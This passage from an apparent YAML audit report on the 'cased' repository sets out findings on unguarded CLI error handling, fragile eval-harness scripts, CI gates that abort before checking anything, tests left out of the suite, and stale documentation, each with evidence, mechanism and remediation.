+        title: The build subcommand reads its inputs unguarded and has no rejection handler, so every failure exits with a raw stack trace
+        concern: moderate
+        locations:
+          - path: src/viewer/build-report.mjs
+            start_line: 857
+            end_line: 861
+          - path: src/viewer/build-report.mjs
+            start_line: 940
+            end_line: 942
+        evidence: |2
+            const findingsYaml = readFileSync(join(auditDir, 'findings.yaml'), 'utf8');
+            const reconYaml = readFileSync(join(auditDir, 'recon.yaml'), 'utf8');
+
+            const findings = parseFindings(findingsYaml);
+            const recon = parseRecon(reconYaml);
+          // CLI entry point (resolve symlinks so skill installs work)
+          if (realpathSync(process.argv[1]) === realpathSync(fileURLToPath(import.meta.url))) {
+            (async () => {
+        evidence_lang: javascript
+        evidence_markers:
+          - lines: 1-2
+            type: del
+            label: no existsSync preflight, unlike the four sibling subcommands
+          - lines: "8"
+            type: mark
+            label: async IIFE with no .catch()
+        mechanism: |
+          The four non-default subcommands guard their inputs and exit with a message: evidence
+          and ledger both check existsSync and exit 2 on a missing findings.yaml
+          (build-report.mjs:990-993, 1012-1016), validate exits 2 when the schema dir is
+          missing. The default build path does none of this — it calls readFileSync straight
+          through, and the whole CLI body is an async IIFE with no .catch(). A missing or
+          malformed findings.yaml, a malformed prior actions-taken.md (parseLedger →
+          YAML.parse throws, prior-audits.mjs:16), or an unreadable font file therefore
+          escapes as an unhandled promise rejection: Node prints the raw stack and exits 1,
+          which is also the code the same script uses for "usage error" and for "validation
+          failed". The result is a documented five-subcommand CLI whose exit codes carry no
+          consistent meaning (missing input file is 2 under evidence, 1 under ledger, 1 with
+          a stack trace under build) and whose most common invocation reports file problems
+          as a Node traceback rather than the "error: <path> not found" the sibling paths
+          emit.
+        remediation: |
+          Wrap the IIFE body in try/catch — or append `.catch(err => { console.error(`error:
+          ${err.message}`); process.exit(1); })` — and add the same existsSync preflight the
+          evidence and ledger subcommands use for findings.yaml and recon.yaml before
+          assembleReport runs. Then fix the taxonomy: document and use one code for "input
+          missing/unreadable" (2) and one for "gate failed" (1) across all five subcommands,
+          and state it in the usage text at build-report.mjs:956-962.
+        temporal:
+          introduced: 2026-04-05
+          last_modified: 2026-08-28
+          commit_count: 11
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - fonts-dir-resolution-unguarded
+            - build-report-subcommand-fallback
+        effort: small
+        effort_notes: One catch handler plus two existsSync checks; the exit-code cleanup is a few lines and a usage-text edit.
+        origin:
+          kind: pre-existing
+        failure_mode: user-visible
+      - slug: fonts-dir-resolution-unguarded
+        title: Font directory resolution can yield undefined and crashes in path.join instead of failing like its sibling check
+        concern: moderate
+        locations:
+          - path: src/viewer/build-report.mjs
+            start_line: 1055
+            end_line: 1065
+          - path: src/viewer/build-report.mjs
+            start_line: 905
+            end_line: 907
+        evidence: |2
+              const viewerDir = viewerDirCandidates.find(d => existsSync(join(d, 'template.html')));
+              if (!viewerDir) {
+                console.error('Cannot find template.html relative to script');
+                process.exit(1);
+              }
+              const fontsDirCandidates = [
+                join(viewerDir, 'fonts'),
+                join(scriptDir, 'fonts'),
+                join(repoRoot, 'vendor', 'fonts'),
+              ];
+              const fontsDir = fontsDirCandidates.find(d => existsSync(d));
+            const fontFaceDecls = fontFiles.map(({ file, family }) => {
+              const fontPath = join(fontsDir, file);
+              const b64 = readFileSync(fontPath).toString('base64');
+        evidence_lang: javascript
+        evidence_markers:
+          - lines: 2-5
+            type: ins
+            label: viewerDir gets a guard and a message
+          - lines: "11"
+            type: del
+            label: fontsDir gets none; find() returns undefined
+          - lines: "13"
+            type: del
+            label: join(undefined, file) throws ERR_INVALID_ARG_TYPE with no context
+        mechanism: |
+          Two adjacent candidate-list resolutions are handled asymmetrically. viewerDir gets an
+          explicit `if (!viewerDir)` guard with an actionable message and exit 1. fontsDir,
+          resolved three lines later by the same Array.prototype.find idiom, gets nothing —
+          find returns undefined when none of the three directories exist. That undefined is
+          passed into assembleReport and reaches `join(fontsDir, file)`, where Node throws
+          `TypeError [ERR_INVALID_ARG_TYPE]: The "path" argument must be of type string.
+          Received undefined` from inside a .map() callback, with no mention of fonts, of the
+          skill layout, or of which of the three candidate paths was searched. Because the CLI
+          has no rejection handler (see build-subcommand-unguarded-io) this surfaces as a bare
+          stack trace. The same block also readFileSync's each woff2 without checking it
+          exists, so a fonts directory that is present but incomplete — a trimmed skill
+          install, an interrupted `scripts/build-viewer.sh` copy — produces an equally
+          contextless ENOENT.
+        remediation: |
+          Mirror the viewerDir guard: `if (!fontsDir) { console.error('Cannot find a fonts
+          directory; looked in: ' + fontsDirCandidates.join(', ')); process.exit(1); }`. In
+          assembleReport, check each font file exists before reading and throw an Error naming
+          the missing file and the resolved fontsDir.
+        temporal:
+          introduced: 2026-04-05
+          last_modified: 2026-08-28
+          commit_count: 11
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - build-subcommand-unguarded-io
+        effort: trivial
+        effort_notes: A four-line guard plus an existsSync in the font loop.
+        origin:
+          kind: pre-existing
+        failure_mode: user-visible
+      - slug: score-json-truncated-by-redirect
+        title: A scorer crash leaves a zero-byte score.json that defeats compare-runs' own 'did run-eval finish?' guard
+        concern: moderate
+        locations:
+          - path: evals/scripts/run-eval
+            start_line: 287
+            end_line: 290
+          - path: evals/scripts/compare-runs.mjs
+            start_line: 14
+            end_line: 18
+        evidence: |2
+            node "$EVALS_DIR/scripts/score-eval.mjs" "$FIXTURE_DIR" "${SCORE_ARGS[@]}" --json \
+              > "$RUN_DIR/score.json"
+            node "$EVALS_DIR/scripts/score-eval.mjs" "$FIXTURE_DIR" "${SCORE_ARGS[@]}" \
+              | tee "$RUN_DIR/score.txt"
+            const scorePath = join(dir, 'score.json');
+            if (!existsSync(scorePath)) {
+              throw new Error(`${dir}: no score.json (did run-eval finish?)`);
+            }
+            const score = JSON.parse(readFileSync(scorePath, 'utf8'));
+        evidence_lang: bash
+        evidence_markers:
+          - lines: "2"
+            type: del
+            label: the shell truncates score.json before the scorer runs
+          - lines: "6"
+            type: mark
+            label: an empty file passes this check
+        mechanism: |
+          The shell creates and truncates score.json before score-eval.mjs runs. If the scorer
+          then exits non-zero — a usage error (exit 2), a malformed findings.yaml from the
+          session under test, an exception in finalizeAudit — `set -e` aborts run-eval, but the
+          empty file it already created stays behind, at the end of a run that cost minutes and
+          real token spend. compare-runs.mjs was written with exactly this failure in mind: its
+          existsSync check exists to say "no score.json (did run-eval finish?)". A zero-byte
+          file passes that check, so the operator instead gets `SyntaxError: Unexpected end of
+          JSON input` from line 18, pointing at the JSON parser rather than at the run that
+          never scored. Both scoring branches redirect this way: the remediate branch shown
+          here at 287-288 and the audit branch at run-eval:299-300.
+        remediation: |
+          Score to a temp file and move it into place only on success: `node ... --json >
+          "$RUN_DIR/score.json.tmp" && mv "$RUN_DIR/score.json.tmp" "$RUN_DIR/score.json"`, with
+          a trap removing the .tmp on abort. Independently, harden loadRun to treat an empty or
+          unparseable score.json as the same "did run-eval finish?" condition rather than
+          letting SyntaxError escape.
+        temporal:
+          introduced: 2026-08-10
+          last_modified: 2026-08-28
+          commit_count: 8
+        chains:
+          enables: []
+          enabled_by:
+            - entrypoint-guard-unresolved-path
+          related: []
+        effort: trivial
+        effort_notes: Two redirect sites to make atomic; one try/catch in loadRun.
+        origin:
+          kind: pre-existing
+        failure_mode: user-visible
+      - slug: hygiene-gate-swallows-git-failure
+        title: The stray-file hygiene gate reports a clean run when git itself fails
+        concern: moderate
+        locations:
+          - path: evals/scripts/run-eval
+            start_line: 215
+            end_line: 221
+        evidence: |
+          SANCTIONED='^record/audits/[^/]+/(README\.md|report\.html|AGENTS\.md|CLAUDE\.md|recon\.yaml|findings\.yaml|actions-taken\.md|assets/sparkline-[^/]+\.svg)$'
+          STRAYS="$(git -C "$WORKDIR" status --porcelain -uall \
+            | sed 's/^...//' \
+            | grep -vE '^(\.crustoleum/|target/)' \
+            | grep -vE "$SANCTIONED" || true)"
+          STRAY_COUNT=0
+          [[ -n "$STRAYS" ]] && STRAY_COUNT="$(echo "$STRAYS" | wc -l | tr -d ' ')"
+        evidence_lang: bash
+        evidence_markers:
+          - lines: "5"
+            type: del
+            label: "|| true absorbs a git failure as readily as grep's no-match"
+        mechanism: |
+          The `|| true` is needed because the final grep exits 1 in the good case (no strays
+          matched), but under `set -o pipefail` it also absorbs a failure of any earlier stage
+          of the pipeline. If `git status` fails — the workdir's .git was removed or rewritten
+          by a fixture setup.sh, the session ran `git init` somewhere unexpected, git is
+          missing — STRAYS is empty, STRAY_COUNT is 0, and the run records
+          `stray_file_count: 0` in run-meta.yaml. That is the same output as a perfectly clean
+          run, so a measurement the harness exists to produce (workspace hygiene is scored as
+          a contract violation per the subagent output contract) silently reports the best
+          possible result whenever its own instrumentation breaks. Nothing downstream can tell
+          the two apart: run-meta.yaml carries no field distinguishing "measured zero" from
+          "could not measure".
+        remediation: |
+          Capture git's status separately from grep's, e.g. `PORCELAIN="$(git -C "$WORKDIR"
+          status --porcelain -uall)" || { echo "error: git status failed in $WORKDIR" >&2; exit
+          1; }` and then filter `$PORCELAIN` through the two greps with `|| true` applied only
+          to that filtering stage. Alternatively record `stray_file_count: unknown` in
+          run-meta.yaml when the git call fails, so the scorer can refuse to credit the run.
+        temporal:
+          introduced: 2026-08-10
+          last_modified: 2026-08-28
+          commit_count: 8
+        chains:
+          enables: []
+          enabled_by: []
+          related: []
+        effort: trivial
+        effort_notes: Split one pipeline into a checked command plus a filter.
+        origin:
+          kind: pre-existing
+        failure_mode: user-visible
+      - slug: entrypoint-guard-unresolved-path
+        title: Both eval CLIs gate main() on a raw string compare that fails silently with exit 0
+        concern: moderate
+        locations:
+          - path: evals/scripts/score-eval.mjs
+            start_line: 494
+            end_line: 496
+          - path: evals/scripts/compare-runs.mjs
+            start_line: 149
+            end_line: 151
+        evidence: |
+          if (import.meta.url === `file://${process.argv[1]}`) {
+            main();
+          }
+          if (import.meta.url === `file://${process.argv[1]}`) {
+            main();
+          }
+        evidence_lang: javascript
+        evidence_markers:
+          - lines: "1"
+            type: del
+            label: raw string compare; breaks on symlinks, spaces, and percent-encoding
+        mechanism: |
+          import.meta.url is a percent-encoded URL; process.argv[1] is a raw filesystem path
+          and is not symlink-resolved. The two diverge whenever the repo lives under a path
+          containing a space, a '#', or any non-ASCII character (the URL carries %20 and the
+          path does not), and whenever the script is reached through a symlink. When they
+          diverge, main() never runs, the process exits 0, and nothing is printed. run-eval
+          redirects that empty stdout straight into score.json (see
+          score-json-truncated-by-redirect), so a run silently produces an empty score file and
+          reports success. The other two entry points in this repo already use the correct
+          idiom — build-report.mjs:941 and recon-to-yaml.mjs:649-652 both compare
+          realpathSync(process.argv[1]) against realpathSync(fileURLToPath(import.meta.url)),
+          and recon-to-yaml.mjs additionally guards against argv[1] being absent — so this is
+          a two-site inconsistency with a known-good sibling, not an unsolved problem.
+        remediation: |
+          Replace both guards with the idiom already used in src/: `if (process.argv[1] &&
+          realpathSync(process.argv[1]) === realpathSync(fileURLToPath(import.meta.url)))`,
+          importing realpathSync from node:fs and fileURLToPath from node:url. Optionally have
+          run-eval assert `-s "$RUN_DIR/score.json"` after each scorer invocation so a silent
+          no-op can never be recorded as a run.
+        temporal:
+          introduced: 2026-08-10
+          last_modified: 2026-08-28
+          commit_count: 4
+        chains:
+          enables:
+            - score-json-truncated-by-redirect
+          enabled_by: []
+          related:
+            - run-eval-effort-ignored-on-claude
+        effort: trivial
+        effort_notes: Two three-line replacements plus two imports.
+        origin:
+          kind: pre-existing
+        failure_mode: user-visible
+      - slug: recon-catch-all-collapses-exit-3
+        title: recon-to-yaml collapses every failure into exit 3 and prints only err.message, contradicting recon's documented exit codes
+        concern: moderate
+        locations:
+          - path: src/recon/recon
+            start_line: 10
+            end_line: 15
+          - path: src/recon/recon-to-yaml.mjs
+            start_line: 703
+            end_line: 706
+        evidence: |
+          # Exit codes:
+          #   0  success — <audit-dir>/recon.yaml written and validated
+          #   1  usage error
+          #   2  not a Rust project (no Cargo.toml in target)
+          #   3  required tool missing or tool failed
+          #   4  validation failure (propagated from recon-to-yaml.mjs)
+            } catch (err) {
+              console.error(`recon: ${err.message}`);
+              process.exit(3);
+            }
+        evidence_lang: bash
+        evidence_markers:
+          - lines: "5"
+            type: mark
+            label: the documented meaning of 3
+          - lines: 7-9
+            type: del
+            label: every failure in the node half becomes 3, message only, no stack
+        mechanism: |
+          The recon pre-runner publishes a four-code taxonomy and `exec`s recon-to-yaml.mjs as
+          its final step, so the Node script's exit code IS recon's exit code. That script wraps
+          its entire body — four JSON/text reads of the temp dir, buildReconObject, schema
+          location, and the writeFileSync — in one catch that exits 3, the code documented as
+          "required tool missing or tool failed". Every unrelated failure therefore claims a
+          tool problem: malformed tokei or cargo JSON, a TypeError from unexpected cargo
+          metadata shape, an unwritable audit directory, a full disk. Printing only err.message
+          compounds it — a caller sees `recon: Cannot read properties of undefined (reading
+          'slice')` and exit 3, with no stack, no file name, and a documented meaning that
+          points them at their PATH. The one code the taxonomy reserves for the script's real
+          job, exit 4 (validation failure), is only reachable on the narrow path where ajv
+          reports errors; a crash while building the object it would have validated is
+          indistinguishable from tokei not being installed.
+        remediation: |
+          Give the catch distinct exits: keep 3 for genuinely missing/failed tooling inputs
+          (ENOENT on the temp-dir files), add a code for "internal error while assembling
+          recon.yaml", and print `err.stack` (or err.message plus the operation being attempted)
+          so the failing step is identifiable. Update the exit-code block in src/recon/recon to
+          match, since the documentation is the contract other callers read.
+        temporal:
+          introduced: 2026-04-11
+          last_modified: 2026-08-28
+          commit_count: 4
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - recon-exec-skips-tmp-cleanup
+        effort: small
+        effort_notes: Split one catch into two paths and update six lines of documentation.
+        origin:
+          kind: pre-existing
+        failure_mode: user-visible
+      - slug: setup-trap-deletes-only-copy
+        title: The fixture's EXIT trap deletes the only copy of the files it moved out of the workdir
+        concern: advisory
+        locations:
+          - path: evals/fixtures/reaudit-rs/setup.sh
+            start_line: 78
+            end_line: 85
+        evidence: |
+          STASH="$(mktemp -d)"
+          # The stash is the only copy of the final main.rs/config.rs and the unsubstituted
+          # ledger while the rewind is in flight: if this script dies mid-run the workdir is
+          # unrecoverable, so re-rsync a fresh one rather than re-running setup.sh over it.
+          trap 'rm -rf "$STASH"' EXIT
+          cp src/main.rs src/config.rs "$STASH/"
+          mv "$LEDGER" "$STASH/actions-taken.md"
+          mv "$AUDIT_DIR" "$STASH/audit-dir"
+        evidence_lang: bash
+        evidence_markers:
+          - lines: "5"
+            type: del
+            label: fires on failure too, deleting the stash
+          - lines: 7-8
+            type: mark
+            label: mv, not cp — the stash is the only copy
+        mechanism: |
+          Lines 84-85 move — not copy — the unsubstituted ledger and the entire prior-audit
+          directory into $STASH, and the script has already run `rm -rf .git` at line 49. The
+          EXIT trap fires on the failure path as readily as on success, so any abort between
+          here and the restore at line 130 (a `cargo check` failure inside commit(), a drifted
+          sed anchor tripping edit()'s no-op guard, a git failure) deletes the only copy of the
+          moved artifacts. The comment acknowledges the workdir becomes unrecoverable, but the
+          trap is what makes it unrecoverable: without it the operator could restore from
+          $STASH. run-eval invokes this under `set -e` (evals/scripts/run-eval:92-94) and
+          aborts, leaving a run directory whose workdir is a half-built fixture with no prior
+          audit in it and no way to tell from the artifacts what went wrong.
+        remediation: |
+          Use `cp -a` instead of `mv` for the ledger and audit directory, or make the trap
+          conditional: set a `SUCCESS=1` flag before the final consistency checks and have the
+          trap run `[[ -n "${SUCCESS:-}" ]] && rm -rf "$STASH" || echo "setup.sh failed;
+          originals preserved in $STASH" >&2`. Also add a trap or explicit cleanup for the
+          per-edit temp file created at line 60, which leaks when sed fails under set -e.
+        temporal:
+          introduced: 2026-08-28
+          last_modified: 2026-08-28
+          commit_count: 1
+        chains:
+          enables: []
+          enabled_by: []
+          related: []
+        effort: trivial
+        effort_notes: Swap two mv for cp -a, or gate the trap on a success flag.
+        origin:
+          kind: pre-existing
+        failure_mode: internal
+      - slug: recon-exec-skips-tmp-cleanup
+        title: recon's exec hand-off discards the EXIT trap, leaking its temp directory on every successful run
+        concern: advisory
+        locations:
+          - path: src/recon/recon
+            start_line: 56
+            end_line: 57
+          - path: src/recon/recon
+            start_line: 164
+            end_line: 165
+        evidence: |
+          TMP="$(mktemp -d -t cased-recon.XXXXXXXX)"
+          trap 'rm -rf "$TMP"' EXIT
+          echo "recon: building recon.yaml"
+          exec node "$SCRIPT_DIR/recon-to-yaml.mjs" "$TMP" "$AUDIT_DIR/recon.yaml"
+        evidence_lang: bash
+        evidence_markers:
+          - lines: "2"
+            type: mark
+            label: the trap
+          - lines: "4"
+            type: del
+            label: exec replaces the process; the trap never fires
+        mechanism: |
+          `exec` replaces the shell process image, so the EXIT trap registered at line 57 never
+          fires. Every run that reaches line 165 — which is every successful run, and every run
+          that fails inside recon-to-yaml.mjs — leaves its mktemp directory behind holding the
+          full cargo metadata, tokei output, and twelve months of git log for the audited
+          project. Only the early-exit paths (exit 1/2/3 above line 165) actually clean up, so
+          the trap protects the cheap cases and abandons the expensive one. On a machine where
+          /tmp is not swept, repeated audits accumulate copies of source-tree metadata for
+          every project audited.
+        remediation: |
+          Drop the `exec` and run the node script normally so the trap fires: `node
+          "$SCRIPT_DIR/recon-to-yaml.mjs" "$TMP" "$AUDIT_DIR/recon.yaml"` as the last command,
+          letting the script's exit status propagate under `set -e` — or keep exec and delete
+          $TMP explicitly before it, passing the assembled inputs by another route.
+        temporal:
+          introduced: 2026-04-11
+          last_modified: 2026-08-28
+          commit_count: 2
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - recon-catch-all-collapses-exit-3
+        effort: trivial
+        effort_notes: One-line change from exec to a plain invocation.
+        origin:
+          kind: pre-existing
+        failure_mode: internal
+  - slug: completeness-surface
+    title: The Completeness Surface
+    thesis: "The prose promises more than the gates deliver: two CI jobs abort before checking anything, a third of the test suite never runs, and several documents describe a repository that no longer exists."
+    verdict: The two significant findings are the ones that matter for launch credibility — a project whose pitch is mechanical gates ships with its bundle-drift gate dead in CI and 31 tests unreachable. Both are one-line fixes. The documentation drift (README keys, AGENTS.md paths, crustoleum counts, a Codex thread cap that is one short) is the ordinary residue of a fast August and should be swept before the release post.
+    flow:
+      - id: push
+        label: push / PR
+        type: start
+      - id: test
+        label: just test
+        type: process
+        findings:
+          - slug: flow-diagram-tests-excluded-from-suite
+            label: 31 tests unlisted
+      - id: ys
+        label: ys installed?
+        type: decision
+        no: abort
+      - id: bundle
+        label: check-bundle + build-smoke
+        type: process
+      - id: green
+        label: CI green
+        type: end
+      - id: abort
+        label: build-schemas.sh exit 1
+        type: process
+        spine: false
+        findings:
+          - slug: ci-drift-gates-abort-without-ys
+            label: gate never runs
+    findings:
+      - slug: ci-drift-gates-abort-without-ys
+        title: CI's bundle and smoke gates abort before they check anything
+        concern: significant
+        locations:
+          - path: .github/workflows/ci.yaml
+            start_line: 25
+            end_line: 31
+          - path: src/schemas/build-schemas.sh
+            start_line: 29
+            end_line: 35
+        evidence: |2
+                - uses: taiki-e/install-action@3d7d7cd5ac7f994c1892ae0c06165095b9139094 # v2.85.1
+                  with:
+                    tool: just
+                - run: npm ci
+                - run: just test
+                - run: just check-bundle
+                - run: just build-smoke
+          for bin in jq ys; do
+            if ! command -v "$bin" >/dev/null 2>&1; then
+              echo "error: required tool '$bin' not found in PATH" >&2
+              [[ "$bin" == "ys" ]] && echo "  install: cargo install yaml-schema --locked" >&2
+              exit 1
+            fi
+          done
+        evidence_lang: yaml
+        evidence_markers:
+          - lines: "3"
+            type: mark
+            label: test job installs just only
+          - lines: 6-7
+            type: del
+            label: both recipes shell into build-schemas.sh
+          - lines: "12"
+            type: del
+            label: hard exit when ys is absent
+        mechanism: |
+          AGENTS.md states as an iron rule that "CI fails on drift (check-contract,
+          check-bundle)". check-bundle and build-smoke both run scripts/build-viewer.sh,
+          whose first action is `bash src/schemas/build-schemas.sh`; that script hard-requires
+          both jq and ys (yaml-schema, a Rust crate) and exits 1 when either is missing.
+          The CI `test` job installs only `just` via install-action and never installs
+          yaml-schema — only the separate `contract` job does (tool: just,yaml-schema),
+          and that job runs check-contract, not check-bundle or build-smoke. So both of the
+          shipped-artifact gates abort with "required tool 'ys' not found in PATH" before
+          rolldown ever runs, and the drift check AGENTS.md promises never executes. The
+          maintainer does not see this locally because ys is installed at
+          /Users/clay/.cargo/bin/ys. Neither README.md nor AGENTS.md lists ys as a
+          prerequisite for check-bundle/build-smoke — AGENTS.md annotates only
+          check-contract with "(needs ys: cargo install yaml-schema)".
+        remediation: |
+          Add yaml-schema to the `test` job's install-action tool list
+          (tool: just,yaml-schema), or split the schema-doc regeneration out of
+          scripts/build-viewer.sh so bundling does not depend on ys. Then annotate
+          check-bundle and build-smoke in AGENTS.md's Commands block with the same
+          "(needs ys)" note check-contract already carries.
+        temporal:
+          introduced: 2026-08-10
+          last_modified: 2026-08-10
+          commit_count: 2
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - flow-diagram-tests-excluded-from-suite
+            - agents-md-stale-after-prelaunch-cleanup
+        effort: trivial
+        effort_notes: One line in ci.yaml plus a doc annotation.
+        origin:
+          kind: pre-existing
+        failure_mode: internal
+      - slug: flow-diagram-tests-excluded-from-suite
+        title: 29 flow-diagram tests are not in `just test`, so nothing runs them
+        concern: significant
+        locations:
+          - path: Justfile
+            start_line: 66
+            end_line: 68
+          - path: .github/workflows/ci.yaml
+            start_line: 29
+            end_line: 29
+        evidence: |
+          # Run tests
+          test:
+              node --test test/build-report.test.mjs test/recon-to-yaml.test.mjs test/eval-score.test.mjs test/eval-score-reaudit.test.mjs test/compare-runs.test.mjs test/prior-audits.test.mjs test/gates.test.mjs
+                - run: just test
+        evidence_lang: just
+        evidence_markers:
+          - lines: "3"
+            type: del
+            label: test/flow-to-svg.test.mjs is absent from the list
+          - lines: "4"
+            type: mark
+            label: CI runs only this recipe
+        mechanism: |
+          test/ holds eight test files; the `test` recipe enumerates seven. test/flow-to-svg.test.mjs
+          (352 lines, 29 `it()` cases covering src/viewer/flow-to-svg.js — spine layout, decision
+          branches, off-spine annotation, loop-back arrows, unknown-slug handling) is silently
+          omitted, and `git log -S'flow-to-svg' -- Justfile` returns zero commits, so it has never
+          been listed since the file was added on 2026-04-06. CI runs `just test` and nothing
+          else, so those 29 assertions have never gated a change, and flowToSvg() runs on every
+          narrative that carries a `flow:` block — which SKILL.md tells agents to add by default.
+          This is the escape-hatch class the rubric calls out: the enumerated runner list is an
+          allowlist, and a file that falls off it fails open — no error, no skipped-test count,
+          just silence. test/ was grepped for `.skip`, `only:`, and TODO/FIXME allowlists and none
+          were found; this omission is the sole escape hatch in the suite.
+        remediation: |
+          Replace the enumeration with a glob so a new test file can never fall off the list:
+          `node --test test/*.test.mjs` (or `node --test test/`). Then run `just test` and confirm
+          the reported test count rises by 29 — and fix whatever the newly-run suite reports.
+        temporal:
+          introduced: 2026-04-06
+          last_modified: 2026-08-28
+          commit_count: 12
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - ci-drift-gates-abort-without-ys
+            - untested-render-and-escape-exports
+        effort: trivial
+        effort_notes: One-line Justfile edit.
+        origin:
+          kind: pre-existing
+        failure_mode: internal
+      - slug: agents-md-stale-after-prelaunch-cleanup
+        title: AGENTS.md briefs agents on a directory, a recipe, and a platform that no longer exist
+        concern: moderate
+        locations:
+          - path: AGENTS.md
+            start_line: 19
+            end_line: 19
+          - path: AGENTS.md
+            start_line: 43
+            end_line: 47
+          - path: AGENTS.md
+            start_line: 60
+            end_line: 60
+        evidence: |
+          | `example/` | Checked-in sample audit used by `just build-example` |
+          just test            # node --test (build-report, recon, eval scorer)
+          just check-bundle    # rebuild viewer bundle, fail on drift
+          just check-contract  # restamp schema contract, fail on drift (needs ys: cargo install yaml-schema)
+          just build-example   # full pipeline against example/ data
+          just eval <fixture>  # live audit eval — real tokens, minutes; not for CI
+          cased runs on Claude Code, Codex, and Gemini. Platform adapters live in
+        evidence_lang: markdown
+        evidence_markers:
+          - lines: "1"
+            type: del
+            label: example/ is untracked — removed from git in a22aa0c
+          - lines: "5"
+            type: del
+            label: no such recipe; `just --list` has build-smoke instead
+          - lines: "7"
+            type: del
+            label: README.md says Gemini is not supported
+        mechanism: |
+          AGENTS.md is the file every agent landing in this repo reads first, and three of its
+          statements were invalidated by the pre-launch cleanup and the audit-churn-reduction
+          merge without being updated. (1) `just build-example` does not exist — a22aa0c
+          ("replace stale example directory with schema-driven smoke test") removed it and
+          added build-smoke; `just --list` confirms the recipe set. An agent that runs the
+          documented command gets "Justfile does not contain recipe `build-example`".
+          (2) `example/` is present on this working tree but untracked (`git ls-files example`
+          is empty), so a fresh clone has no such directory; the Layout table promises a
+          checked-in artifact that no longer ships. (3) "cased runs on Claude Code, Codex, and
+          Gemini" contradicts README.md:109-113 ("Other platforms — Not yet"), evals/README.md's
+          "Not yet built: Gemini platform case in run-eval — removed pre-launch", and 505eb92
+          ("drop unverified Gemini shim"). By this project's own rule that documentation wins
+          over code, two documents now assert opposite things about the same capability.
+          Secondary: line 3 of the evidence annotates only check-contract as needing ys, though
+          check-bundle needs it too (see ci-drift-gates-abort-without-ys).
+        remediation: |
+          Replace the `example/` Layout row and the `just build-example` command line with
+          `build-smoke` ("end-to-end render from the canonical schema examples"); either
+          commit example/ or delete it from the working tree. Change the Multi-platform line
+          to "cased runs on Claude Code and Codex; Gemini is unsupported until an adapter and
+          eval verification exist" so it matches README.md and evals/README.md. While editing,
+          update the `just test` comment to name the gates/prior-audits/compare-runs modules
+          it actually runs.
+        temporal:
+          introduced: 2026-08-10
+          last_modified: 2026-08-10
+          commit_count: 1
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - ci-drift-gates-abort-without-ys
+            - readme-crustoleum-counts-and-agent-table-stale
+        effort: trivial
+        effort_notes: Three edits in one file.
+        origin:
+          kind: pre-existing
+        failure_mode: documentation
+      - slug: readme-slide-mode-wrong-key
+        title: README tells readers to press S for slide mode; the viewer binds P
+        concern: moderate
+        locations:
+          - path: README.md
+            start_line: 137
+            end_line: 137
+          - path: src/viewer/slides.js
+            start_line: 15
+            end_line: 17
+        evidence: |
+          - **Slide mode** — press S to present findings one at a time
+            document.addEventListener('keydown', (e) => {
+              if (e.key === 'p' && !e.ctrlKey && !e.metaKey && !isInputFocused()) {
+                toggleMode(body);
+        evidence_lang: markdown
+        evidence_markers:
+          - lines: "1"
+            type: del
+            label: README promises S
+          - lines: "3"
+            type: ins
+            label: the only toggle binding is 'p'
+        mechanism: |
+          slides.js registers exactly one mode-toggle binding, on `e.key === 'p'`; the other
+          handled keys are Escape, ArrowLeft/ArrowRight and Space, all of which only act once
+          present mode is already active. Pressing S in a rendered report does nothing. Slide
+          mode is one of four features README's "After the audit" section advertises as the
+          payoff for opening report.html, and it is the only one whose invocation the reader
+          cannot discover by looking at the page — a reader who presses S and sees nothing
+          concludes the feature is broken. No other document names a key, so README is the
+          single source and it is wrong. (A toggle button also exists, so the feature itself
+          works; only the documented invocation fails.)
+        remediation: |
+          Change README.md:137 to "press P to present findings one at a time". If S is the
+          intended key, change slides.js:16 instead and rebuild the bundle with
+          `just build-viewer` so skills/cased/templates/viewer.js picks up the change.
+        temporal:
+          introduced: 2026-03-21
+          last_modified: 2026-08-10
+          commit_count: 5
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - readme-crustoleum-counts-and-agent-table-stale
+        effort: trivial
+        effort_notes: One character in one line.
+        origin:
+          kind: pre-existing
+        failure_mode: documentation
+      - slug: finalize-skips-ledger-commit-verification
+        title: "`finalize` claims to run every gate but skips the ledger's commit checks"
+        concern: moderate
+        locations:
+          - path: src/viewer/build-report.mjs
+            start_line: 831
+            end_line: 836
+          - path: src/viewer/gates.mjs
+            start_line: 123
+            end_line: 129
+        evidence: |2
+            if (existsSync(ledgerPath)) {
+              const problems = lintLedger({
+                ledgerText: readFileSync(ledgerPath, 'utf8'),
+                findingsDoc: findings,
+                testCommand: recon?.testing?.command || null,
+              });
+              if (gitLog) {
+                for (const sha of e.commits) {
+                  const info = gitLog(sha);
+                  if (!info.exists) { err(e.heading, `commit ${sha} not found in target repo (squash-merge? record the merge SHA)`); continue; }
+                  for (const slug of e.addresses) if (!info.trailers.includes(slug)) warn(e.heading, `commit ${sha} lacks 'Audit-Finding: ${slug}' trailer`);
+                }
+              }
+        evidence_lang: javascript
+        evidence_markers:
+          - lines: 2-6
+            type: del
+            label: finalize omits gitLog
+          - lines: "7"
+            type: mark
+            label: entire block gated on gitLog being supplied
+          - lines: "10"
+            type: del
+            label: an error-level check finalize therefore never runs
+        mechanism: |
+          The CLI advertises finalize as "run every gate; refuse to call the audit finished
+          until they pass" (build-report.mjs:961), and SKILL.md says "An audit is not complete
+          until `finalize` exits 0." But finalizeAudit calls lintLedger without the `gitLog`
+          argument, while the standalone `ledger` subcommand supplies one built from
+          `git log -1 --format=%(trailers:key=Audit-Finding,valueonly)` (build-report.mjs:1022-1033).
+          Everything inside lintLedger's `if (gitLog)` block is therefore dead during finalize —
+          including the *error*-level "commit <sha> not found in target repo" check. Net effect:
+          `ledger` is strictly stricter than the gate documented as the superset. An
+          actions-taken.md whose `fixed` entry cites a SHA that does not exist in the repo (a
+          hallucinated commit, or a pre-squash SHA) fails `ledger` with an error but passes
+          `finalize` clean, and finalize is the check SKILL.md tells the agent to announce
+          out loud as proof of completion. The Audit-Finding trailer warnings are lost the same
+          way. evals/README.md compounds the confusion by describing lintLedger as "what a live
+          audit's `finalize` step runs against actions-taken.md" without noting the omission.
+        remediation: |
+          Build the same gitLog closure inside finalizeAudit (it already resolves `root` at
+          line 800) and pass it to lintLedger, so finalize is a true superset of `ledger`.
+          Alternatively, if skipping git access during finalize is deliberate, say so in the
